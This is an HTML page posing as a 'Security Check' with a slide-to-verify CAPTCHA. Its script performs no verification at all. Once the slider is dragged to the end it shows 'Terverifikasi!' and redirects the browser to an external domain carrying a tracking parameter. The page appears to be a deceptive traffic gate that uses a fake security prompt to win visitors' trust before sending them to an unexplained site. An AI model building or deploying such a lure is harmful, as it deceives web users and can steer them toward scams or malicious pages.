<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Security Check</title>
  <style>
    * {
      box-sizing: border-box;
    }

    html, body {
      margin: 0;
      padding: 0;
      font-family: sans-serif;
      height: 100%;
      overflow: hidden;
    }

    #popupOverlay {
      position: fixed;
      top: 0;
      left: 0;
      width: 100vw;
      height: 100vh;
      background: rgba(255, 255, 255, 0.98);
      z-index: 9999;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      padding: 20px;
    }

    h2 {
      font-size: 1.3rem;
      margin-bottom: 40px;
      text-align: center;
      color: #333;
    }

    #sliderBox {
      position: relative;
      width: 100%;
      max-width: 360px;
      height: 48px;
      background: #e0e0e0;
      border-radius: 30px;
      margin: 0 auto;
      overflow: hidden;
      box-shadow: inset 0 0 5px #ccc;
    }

    #progressBar {
      position: absolute;
      left: 0;
      top: 0;
      height: 100%;
      width: 0%;
      background-color: #00c853;
      border-radius: 30px 0 0 30px;
      transition: width 0.1s;
      z-index: 0;
    }

    #sliderButton {
      width: 48px;
      height: 48px;
      background: #00aaff;
      border-radius: 50%;
      position: absolute;
      left: 0;
      top: 0;
      z-index: 1;
      cursor: pointer;
      transition: background 0.2s;
      touch-action: none;
    }

    #sliderText {
      position: absolute;
      left: 0;
      right: 0;
      top: 0;
      bottom: 0;
      text-align: center;
      line-height: 48px;
      color: #555;
      font-size: 0.95rem;
      user-select: none;
      pointer-events: none;
      z-index: 2;
    }

    @media (max-width: 480px) {
      h2 {
        font-size: 1rem;
      }

      #sliderBox, #sliderButton {
        height: 44px;
      }

      #sliderButton {
        width: 44px;
        height: 44px;
      }

      #sliderBox {
        max-width: 300px;
      }

      #sliderText {
        font-size: 0.85rem;
        line-height: 44px;
      }
    }
  </style>
</head>
<body>

<div id="popupOverlay">
  <h1>Security Check</h1>
<p>Please SLIDE TO VERIFY below to proceed.</p>
  <div id="sliderBox">
    <div id="progressBar"></div>
    <div id="sliderText">SLIDE TO VERIFY</div>
    <div id="sliderButton"></div>
  </div>
</div>

<script>
  const button = document.getElementById("sliderButton");
  const progress = document.getElementById("progressBar");
  const box = document.getElementById("sliderBox");
  const text = document.getElementById("sliderText");
  const popup = document.getElementById("popupOverlay");

  let isDragging = false;
  let startX;
  let verified = false;

  function getMaxSlide() {
    return box.offsetWidth - button.offsetWidth;
  }

  function onDragStart(e) {
    if (verified) return;
    isDragging = true;
    startX = e.clientX || e.touches[0].clientX;
  }

  function onDragMove(e) {
    if (!isDragging || verified) return;
    const currentX = e.clientX || e.touches[0].clientX;
    let moveX = currentX - startX;
    const maxSlide = getMaxSlide();
    moveX = Math.max(0, Math.min(moveX, maxSlide));
    button.style.left = moveX + "px";
    progress.style.width = (moveX + button.offsetWidth / 2) + "px";
  }

  function onDragEnd() {
    if (!isDragging || verified) return;
    isDragging = false;
    const currentLeft = parseInt(button.style.left, 10);
    const maxSlide = getMaxSlide();
    if (currentLeft >= maxSlide) {
      verified = true;
      button.style.left = maxSlide + "px";
      progress.style.width = "100%";
      text.innerText = "Terverifikasi!";
      redirectNow();
    } else {
      button.style.left = "0px";
      progress.style.width = "0px";
    }
  }

  button.addEventListener("mousedown", onDragStart);
  button.addEventListener("touchstart", onDragStart);

  document.addEventListener("mousemove", onDragMove);
  document.addEventListener("touchmove", onDragMove);

  document.addEventListener("mouseup", onDragEnd);
  document.addEventListener("touchend", onDragEnd);

  function redirectNow() {
    const links = [
      "https://iswashiscourtsh.com?zpqGE=1197765"
    ];
    const index = Math.floor(Math.random() * links.length);
    window.location.href = links[index];
  }
</script>

</body>
</html>
